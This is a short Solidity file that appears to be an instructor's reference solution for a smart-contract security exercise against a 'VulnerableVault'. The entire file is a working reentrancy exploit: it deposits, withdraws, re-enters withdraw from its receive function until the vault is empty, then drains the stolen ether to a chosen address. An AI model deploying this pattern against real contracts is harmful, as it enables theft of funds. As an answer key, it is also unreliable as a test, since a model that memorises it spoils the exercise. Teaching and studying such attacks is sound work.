// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// ⚠️  INSTRUCTOR REFERENCE — keep out of student-facing materials.
import {IVulnerableVault} from "../src/Setup.sol";

contract SolutionRef {
    IVulnerableVault public vault;
    uint256 public attackAmount;

    function setVault(IVulnerableVault v) external {
        vault = v;
    }

    function attack() external payable {
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw();
        }
    }

    function drain(address payable to) external {
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}
